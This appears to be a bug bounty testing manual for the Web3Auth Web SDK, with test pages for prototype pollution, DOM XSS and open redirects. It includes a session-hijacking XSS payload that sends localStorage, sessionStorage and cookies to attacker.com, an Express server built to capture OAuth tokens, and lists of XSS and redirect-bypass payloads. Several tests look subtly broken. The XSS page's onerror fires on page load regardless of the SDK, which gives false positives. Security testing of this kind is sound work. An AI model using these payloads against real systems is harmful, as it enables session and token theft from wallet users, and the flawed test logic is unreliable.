# **WEB3AUTH SECURITY TESTING MANUAL**
## **Refined Bug Bounty Manual Testing Report**

**Version:** 1.0
**Date:** April 7, 2026
**Target:** Web3Auth Web SDK (@web3auth/modal, @web3auth/no-modal)
**Testing Environment:** Browser-based Web Application
**Recommended Tools:** Browser DevTools, Burp Suite, OWASP ZAP, Postman

---

## **TABLE OF CONTENTS**

1. [Test Environment Setup](#test-environment-setup)
2. [Critical Vulnerability Tests](#critical-vulnerability-tests)
3. [High Severity Tests](#high-severity-tests)
4. [Medium Severity Tests](#medium-severity-tests)
5. [Security Regression Tests](#security-regression-tests)
6. [Automated Testing Scripts](#automated-testing-scripts)
7. [Reporting Guidelines](#reporting-guidelines)

---

## **TEST ENVIRONMENT SETUP**

### **Prerequisites**

```bash
# 1. Clone the repository
git clone https://github.com/Web3Auth/web3auth-web.git
cd web3auth-web

# 2. Install dependencies
npm install

# 3. Build the packages
npm run build

# 4. Set up test environment
cd demo/react-app-no-modal
npm install
npm start
```

### **Required Tools**

1. **Browser Extensions:**
   - React Developer Tools
   - Web Developer Tools (Console, Network, Storage)
   - Edit This Cookie (for session manipulation)

2. **Security Testing Tools:**
   - Burp Suite Community/Pro
   - OWASP ZAP
   - Postman/Insomnia

3. **Testing Scripts:**
   - Node.js v22+ for automation
   - Python 3.x for exploit scripts

### **Test Credentials**

```javascript
// Create a test Web3Auth instance
const testConfig = {
  clientId: "YOUR_TEST_CLIENT_ID", // Get from Web3Auth Dashboard
  chainConfig: {
    chainNamespace: "eip155",
    chainId: "0x1", // Ethereum Mainnet for testing
    rpcTarget: "https://rpc.ankr.com/eth"
  }
};
```

---

## **CRITICAL VULNERABILITY TESTS**

### **TEST CASE #1: Prototype Pollution Attack**

**Objective:** Verify if deepmerge operations are vulnerable to prototype pollution

**Severity:** CRITICAL
**CVSS:** 9.1
**CWE:** CWE-1321

#### **Manual Test Steps:**

**Step 1: Setup Test Page**

Create file: `test-prototype-pollution.html`

```html
<!DOCTYPE html>
<html>
<head>
  <title>Prototype Pollution Test</title>
  <script src="https://cdn.jsdelivr.net/npm/@web3auth/modal@latest"></script>
</head>
<body>
  <h1>Web3Auth Prototype Pollution Test</h1>
  <button id="test-pollution">Test Pollution</button>
  <button id="verify-pollution">Verify Pollution</button>
  <pre id="results"></pre>

  <script>
    const results = document.getElementById('results');

    // Initialize Web3Auth
    const web3auth = new window.Modal.Web3Auth({
      clientId: "YOUR_CLIENT_ID",
      chainConfig: {
        chainNamespace: "eip155",
        chainId: "0x1"
      }
    });

    document.getElementById('test-pollution').addEventListener('click', async () => {
      results.textContent = 'Testing prototype pollution...\n';

      try {
        // Test Case 1: __proto__ injection
        const pollutionPayload1 = {
          authConnection: "google",
          __proto__: {
            isPolluted: true,
            isAdmin: true,
            role: "administrator"
          }
        };

        await web3auth.connect(pollutionPayload1);

      } catch (error) {
        results.textContent += `Error (expected): ${error.message}\n`;
      }
    });

    document.getElementById('verify-pollution').addEventListener('click', () => {
      // Verify if pollution occurred
      const testObj = {};
      const verificationResults = {
        'Object.prototype.isPolluted': testObj.isPolluted,
        'Object.prototype.isAdmin': testObj.isAdmin,
        'Object.prototype.role': testObj.role,
        'Pollution Status': (testObj.isPolluted === true) ? '🔴 VULNERABLE' : '✅ PROTECTED'
      };

      results.textContent += '\n=== VERIFICATION RESULTS ===\n';
      results.textContent += JSON.stringify(verificationResults, null, 2);
    });
  </script>
</body>
</html>
```

**Step 2: Execute Test**

1. Open the HTML file in a browser
2. Click "Test Pollution" button
3. Click "Verify Pollution" button
4. **Expected Result (VULNERABLE):** `testObj.isPolluted === true`
5. **Expected Result (FIXED):** `testObj.isPolluted === undefined`

**Step 3: Advanced Pollution Test**

```javascript
// Test Case 2: Constructor.prototype injection
const advancedPayload = {
  authConnection: "google",
  constructor: {
    prototype: {
      compromised: true
    }
  }
};

// Test Case 3: Nested pollution
const nestedPayload = {
  authConnection: "google",
  extraLoginOptions: {
    __proto__: {
      bypass: true
    }
  }
};

// Test each payload and verify
```

**Step 4: Document Results**

```
TEST RESULTS:
-------------
Test Case 1 (__proto__): [PASS/FAIL]
Test Case 2 (constructor): [PASS/FAIL]
Test Case 3 (nested): [PASS/FAIL]

Evidence:
- Screenshot of console showing polluted properties
- Network trace showing malicious payload
- DOM inspection showing modified prototype chain
```

**Severity Assessment:**
- ✅ **PASS:** No pollution occurs
- 🔴 **FAIL:** Any object inherits injected properties

---

### **TEST CASE #2: DOM-Based XSS via innerHTML**

**Objective:** Test if innerHTML usage allows script execution

**Severity:** CRITICAL
**CVSS:** 8.6
**CWE:** CWE-79

#### **Manual Test Steps:**

**Step 1: Create Malicious Test Page**

Create file: `test-dom-xss.html`

```html
<!DOCTYPE html>
<html>
<head>
  <title>DOM XSS Test</title>
  <script src="https://cdn.jsdelivr.net/npm/@web3auth/modal@latest"></script>
</head>
<body>
  <h1>Web3Auth DOM XSS Test</h1>

  <!-- Test Target Element with XSS Payload -->
  <div id="malicious-container">
    <img src=x onerror="window.XSS_TRIGGERED = true; console.log('🔴 XSS EXECUTED!'); alert('XSS Vulnerability Confirmed!')">
  </div>

  <button id="trigger-xss">Initialize Web3Auth (Trigger XSS)</button>
  <pre id="results"></pre>

  <script>
    const results = document.getElementById('results');

    document.getElementById('trigger-xss').addEventListener('click', async () => {
      results.textContent = 'Testing DOM XSS...\n';

      // Reset XSS flag
      window.XSS_TRIGGERED = false;

      try {
        const web3auth = new window.Modal.Web3Auth({
          clientId: "YOUR_CLIENT_ID",
          chainConfig: {
            chainNamespace: "eip155",
            chainId: "0x1"
          },
          uiConfig: {
            widgetType: 'embed',
            targetId: 'malicious-container' // Points to element with XSS
          }
        });

        await web3auth.initModal();

        // Check if XSS was triggered
        setTimeout(() => {
          if (window.XSS_TRIGGERED) {
            results.textContent += '🔴 VULNERABILITY CONFIRMED: XSS executed!\n';
            results.textContent += 'Impact: Attacker can execute arbitrary JavaScript\n';
          } else {
            results.textContent += '✅ XSS PREVENTED: innerHTML safely handled\n';
          }
        }, 1000);

      } catch (error) {
        results.textContent += `Error: ${error.message}\n`;
        if (window.XSS_TRIGGERED) {
          results.textContent += '⚠️  XSS executed despite error!\n';
        }
      }
    });
  </script>
</body>
</html>
```

**Step 2: Advanced XSS Payloads**

Test multiple XSS vectors:

```html
<!-- Test Vector 1: Basic img onerror -->
<div id="test1">
  <img src=x onerror=alert('XSS-1')>
</div>

<!-- Test Vector 2: SVG-based XSS -->
<div id="test2">
  <svg onload=alert('XSS-2')>
</div>

<!-- Test Vector 3: Script tag -->
<div id="test3">
  <script>alert('XSS-3')</script>
</div>

<!-- Test Vector 4: Event handler -->
<div id="test4">
  <body onload=alert('XSS-4')>
</div>

<!-- Test Vector 5: Iframe srcdoc -->
<div id="test5">
  <iframe srcdoc="<script>alert('XSS-5')</script>">
</div>

<!-- Test Vector 6: Data URI -->
<div id="test6">
  <img src="data:text/html,<script>alert('XSS-6')</script>">
</div>
```

**Step 3: Session Hijacking Payload**

```html
<div id="session-steal">
  <img src=x onerror="
    // Steal session data
    const sessionData = {
      localStorage: {...localStorage},
      sessionStorage: {...sessionStorage},
      cookies: document.cookie
    };

    // Exfiltrate
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(sessionData)
    });
  ">
</div>
```

**Step 4: Test Execution**

1. Open each test file in browser
2. Click trigger button
3. Observe if alert() executes
4. Check browser console for execution evidence
5. Monitor network tab for exfiltration attempts

**Documentation Template:**

```
XSS TEST RESULTS:
-----------------
Payload Type: [img onerror / svg onload / script tag / etc.]
Target Element ID: malicious-container
Execution Status: [EXECUTED / BLOCKED]
Browser: Chrome 125.0.6422.112
Evidence:
- [x] Alert dialog appeared
- [x] Console log message visible
- [x] window.XSS_TRIGGERED = true
- [x] Network request to attacker.com sent

Screenshots:
1. alert_dialog.png
2. console_output.png
3. network_trace.png

Risk Assessment: CRITICAL
Exploitability: High (requires embed mode usage)
Impact: Session theft, wallet drain, full account takeover
```

---

### **TEST CASE #3: Open Redirect to OAuth Token Theft**

**Objective:** Verify redirect URL validation

**Severity:** HIGH
**CVSS:** 8.1
**CWE:** CWE-601

#### **Manual Test Steps:**

**Step 1: Setup Malicious Redirect Server**

Create file: `malicious-server.js`

```javascript
const express = require('express');
const app = express();

// Attacker's token capture endpoint
app.get('/capture-oauth', (req, res) => {
  console.log('🔴 OAUTH TOKENS CAPTURED:');
  console.log('Query Params:', req.query);
  console.log('Headers:', req.headers);

  // Log all captured data
  const capturedData = {
    timestamp: new Date().toISOString(),
    code: req.query.code,
    state: req.query.state,
    id_token: req.query.id_token,
    access_token: req.query.access_token,
    userAgent: req.headers['user-agent'],
    referer: req.headers['referer']
  };

  // Save to file
  const fs = require('fs');
  fs.appendFileSync('captured-tokens.json', JSON.stringify(capturedData, null, 2) + '\n');

  // Display success page
  res.send(`
    <h1>✅ Authentication Successful</h1>
    <p>Your wallet has been connected successfully.</p>
    <p style="color: red; font-size: 10px;">
      (This is a security test - tokens captured for demonstration)
    </p>
  `);
});

app.listen(3000, () => {
  console.log('Malicious server running on http://localhost:3000');
  console.log('Waiting for OAuth redirects...');
});
```

**Step 2: Create Test Application**

Create file: `test-open-redirect.html`

```html
<!DOCTYPE html>
<html>
<head>
  <title>Open Redirect Test</title>
  <script src="https://cdn.jsdelivr.net/npm/@web3auth/modal@latest"></script>
</head>
<body>
  <h1>Open Redirect Vulnerability Test</h1>

  <h2>Test Cases:</h2>
  <button id="test-malicious-redirect">Test Malicious Redirect</button>
  <button id="test-external-domain">Test External Domain</button>
  <button id="test-subdomain-takeover">Test Subdomain Takeover</button>

  <pre id="results"></pre>

  <script>
    const results = document.getElementById('results');

    // Test Case 1: Direct malicious redirect
    document.getElementById('test-malicious-redirect').addEventListener('click', async () => {
      results.textContent = 'Testing malicious redirect URL...\n';

      try {
        const web3auth = new window.Modal.Web3Auth({
          clientId: "YOUR_CLIENT_ID",
          chainConfig: {
            chainNamespace: "eip155",
            chainId: "0x1"
          },
          authOptions: {
            // ATTACK: Redirect to attacker-controlled domain
            redirectUrl: 'http://localhost:3000/capture-oauth'
          }
        });

        await web3auth.initModal();
        await web3auth.connect({ authConnection: 'google' });

        results.textContent += '🔴 VULNERABLE: Malicious redirect accepted!\n';

      } catch (error) {
        if (error.message.includes('Invalid redirect URL')) {
          results.textContent += '✅ PROTECTED: Malicious redirect blocked\n';
        } else {
          results.textContent += `Error: ${error.message}\n`;
        }
      }
    });

    // Test Case 2: External domain variations
    document.getElementById('test-external-domain').addEventListener('click', async () => {
      const maliciousUrls = [
        'https://evil.com/steal',
        'https://web3auth.io.evil.com/phishing', // Subdomain trick
        'https://evil.com@web3auth.io/steal', // User info trick
        'https://web3auth.io/../../../evil.com', // Path traversal
        'javascript:alert("XSS")', // JavaScript protocol
        'data:text/html,<script>alert("XSS")</script>', // Data URI
      ];

      results.textContent = 'Testing redirect URL bypasses...\n\n';

      for (const url of maliciousUrls) {
        try {
          const web3auth = new window.Modal.Web3Auth({
            clientId: "YOUR_CLIENT_ID",
            authOptions: { redirectUrl: url }
          });

          await web3auth.initModal();
          results.textContent += `🔴 BYPASS: ${url}\n`;

        } catch (error) {
          results.textContent += `✅ BLOCKED: ${url}\n`;
        }
      }
    });
  </script>
</body>
</html>
```

**Step 3: Execute Test**

1. Start malicious server: `node malicious-server.js`
2. Open test HTML in browser
3. Click "Test Malicious Redirect"
4. Attempt to authenticate
5. Check if redirect occurs to malicious server
6. Review `captured-tokens.json` for stolen data

**Step 4: Burp Suite Interception**

```
1. Configure Burp proxy (127.0.0.1:8080)
2. Enable interception
3. Trigger OAuth flow
4. Intercept redirect request
5. Modify redirect_uri parameter:

   Original: redirect_uri=https://auth.web3auth.io/callback
   Modified: redirect_uri=https://evil.com/steal

6. Forward request
7. Observe if OAuth provider accepts modified redirect
```

**Documentation:**

```
OPEN REDIRECT TEST RESULTS:
---------------------------
Test Payload: http://localhost:3000/capture-oauth
Validation Status: [ACCEPTED / REJECTED]

Evidence:
1. Request intercepted in Burp Suite
2. Modified redirect_uri parameter
3. OAuth tokens received at malicious endpoint
4. captured-tokens.json contains:
   - Authorization code
   - ID token
   - Access token
   - State parameter

Risk: HIGH
Impact: Full OAuth flow compromise, token theft, account takeover
Recommendation: Implement strict whitelist validation
```

---

## **HIGH SEVERITY TESTS**

### **TEST CASE #4: Session Storage Theft**

**Manual Test:**

```javascript
// Test session storage exposure
console.log('=== SESSION STORAGE AUDIT ===');

// 1. Enumerate all session storage
for (let i = 0; i < sessionStorage.length; i++) {
  const key = sessionStorage.key(i);
  const value = sessionStorage.getItem(key);
  console.log(`Key: ${key}`);
  console.log(`Value: ${value}`);
  console.log(`Sensitive: ${isSensitive(key, value)}`);
  console.log('---');
}

// 2. Check for encryption
function isSensitive(key, value) {
  const sensitivePatterns = ['token', 'key', 'id', 'secret', 'auth', 'session'];
  const isKeyMatched = sensitivePatterns.some(p => key.toLowerCase().includes(p));
  const looksEncrypted = /^[A-Za-z0-9+/=]{40,}$/.test(value);

  return isKeyMatched && !looksEncrypted;
}

// 3. Exfiltration test
async function exfiltrateSession() {
  const data = {};
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    data[key] = sessionStorage.getItem(key);
  }

  // Simulate exfiltration
  console.log('Exfiltrating:', data);
  // await fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(data) });
}
```

---

## **AUTOMATED TESTING SCRIPTS**

### **Automated Security Scanner**

Create file: `security-scanner.js`

```javascript
#!/usr/bin/env node

const puppeteer = require('puppeteer');
const fs = require('fs');

async function runSecurityScan() {
  console.log('🔍 Starting Web3Auth Security Scan...\n');

  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  const results = {
    timestamp: new Date().toISOString(),
    tests: []
  };

  // Test 1: Prototype Pollution
  console.log('Testing: Prototype Pollution...');
  await page.goto('http://localhost:3000/test-prototype-pollution.html');

  const pollutionResult = await page.evaluate(() => {
    // Inject pollution payload
    const testObj = {};
    return {
      isPolluted: testObj.isPolluted !== undefined,
      properties: Object.getOwnPropertyNames(Object.prototype)
    };
  });

  results.tests.push({
    name: 'Prototype Pollution',
    status: pollutionResult.isPolluted ? 'FAIL' : 'PASS',
    severity: 'CRITICAL',
    details: pollutionResult
  });

  // Test 2: XSS Detection
  console.log('Testing: DOM XSS...');
  page.on('dialog', async dialog => {
    console.log('🔴 XSS Alert detected:', dialog.message());
    results.tests.push({
      name: 'DOM XSS',
      status: 'FAIL',
      severity: 'CRITICAL',
      details: { alertMessage: dialog.message() }
    });
    await dialog.dismiss();
  });

  await page.goto('http://localhost:3000/test-dom-xss.html');
  await page.click('#trigger-xss');
  await page.waitForTimeout(2000);

  // Test 3: Session Storage Analysis
  console.log('Testing: Session Storage Security...');
  const sessionData = await page.evaluate(() => {
    const data = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      data[key] = {
        value: sessionStorage.getItem(key),
        encrypted: /^[A-Za-z0-9+/=]{40,}$/.test(sessionStorage.getItem(key))
      };
    }
    return data;
  });

  const unencryptedSensitive = Object.entries(sessionData)
    .filter(([key, val]) => !val.encrypted && /token|key|secret/i.test(key));

  results.tests.push({
    name: 'Session Storage Security',
    status: unencryptedSensitive.length > 0 ? 'FAIL' : 'PASS',
    severity: 'HIGH',
    details: { unencryptedSensitive }
  });

  // Generate report
  console.log('\n📊 Security Scan Complete!\n');
  console.log('Results:', JSON.stringify(results, null, 2));

  fs.writeFileSync('security-scan-report.json', JSON.stringify(results, null, 2));

  await browser.close();
}

runSecurityScan().catch(console.error);
```

---

## **REPORTING GUIDELINES**

### **Vulnerability Report Template**

```markdown
# Security Vulnerability Report

## Summary
[Brief description of the vulnerability]

## Severity
- **CVSS Score:** [0.0-10.0]
- **Severity Level:** [CRITICAL/HIGH/MEDIUM/LOW]
- **CWE ID:** [CWE-XXX]

## Affected Components
- Package: @web3auth/modal@10.15.0
- File: /packages/modal/src/ui/loginModal.tsx
- Line: 69

## Vulnerability Details
[Detailed technical description]

## Proof of Concept
```html
[Complete, reproducible PoC code]
```

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Impact Assessment
- **Confidentiality:** [HIGH/MEDIUM/LOW]
- **Integrity:** [HIGH/MEDIUM/LOW]
- **Availability:** [HIGH/MEDIUM/LOW]

Real-world impact:
- Session hijacking possible
- Private key theft
- Wallet drainage

## Evidence
- Screenshot 1: [vulnerability-triggered.png]
- Screenshot 2: [console-output.png]
- Video: [exploitation-demo.mp4]
- Network trace: [burp-capture.xml]

## Recommended Fix
```typescript
[Proposed remediation code]
```

## References
- OWASP Top 10 2021: A03:2021 – Injection
- CWE-79: Cross-site Scripting (XSS)
- Web3Auth Security Documentation

## Contact
- Researcher: [Your Name]
- Email: [your-email]
- Date: 2026-04-07
```

---

## **TESTING CHECKLIST**

### **Pre-Testing**
- [ ] Test environment setup complete
- [ ] All tools installed and configured
- [ ] Test credentials obtained
- [ ] Proxy configured (Burp/ZAP)
- [ ] Documentation template ready

### **Critical Tests**
- [ ] Prototype pollution test executed
- [ ] DOM XSS test completed
- [ ] Open redirect validation tested
- [ ] Session storage security verified
- [ ] Nonce generation randomness tested

### **Documentation**
- [ ] Screenshots captured
- [ ] Video recording created
- [ ] Network traces saved
- [ ] PoC code documented
- [ ] Remediation proposed

### **Post-Testing**
- [ ] Test environment cleaned up
- [ ] Sensitive data removed
- [ ] Report generated
- [ ] Evidence archived
- [ ] Submission prepared

---

## **APPENDIX: TESTING TOOLS CONFIGURATION**

### **Burp Suite Configuration**

```
1. Proxy Settings:
   - Listen on: 127.0.0.1:8080
   - Intercept: Enabled

2. Target Scope:
   - Include: https://auth.web3auth.io/*
   - Include: http://localhost:*

3. Active Scan Settings:
   - XSS checks: Enabled
   - SQL injection: Enabled
   - Command injection: Enabled

4. Extensions to Install:
   - Autorize (for authorization testing)
   - Param Miner (for parameter discovery)
   - Turbo Intruder (for fuzzing)
```

### **Browser DevTools Tips**

```javascript
// Monitor all storage changes
let originalSetItem = Storage.prototype.setItem;
Storage.prototype.setItem = function(key, value) {
  console.log('Storage.setItem:', key, value);
  return originalSetItem.apply(this, arguments);
};

// Monitor all network requests
const originalFetch = window.fetch;
window.fetch = function(...args) {
  console.log('Fetch:', args);
  return originalFetch.apply(this, arguments);
};

// Monitor DOM mutations
const observer = new MutationObserver(mutations => {
  mutations.forEach(mut => console.log('DOM Change:', mut));
});
observer.observe(document.body, { childList: true, subtree: true });
```

---

**End of Manual Testing Report**

This comprehensive manual testing guide provides security researchers with step-by-step instructions to identify, validate, and document security vulnerabilities in the Web3Auth Web SDK. Each test case includes detailed procedures, expected results, and evidence collection methods for professional bug bounty reporting.
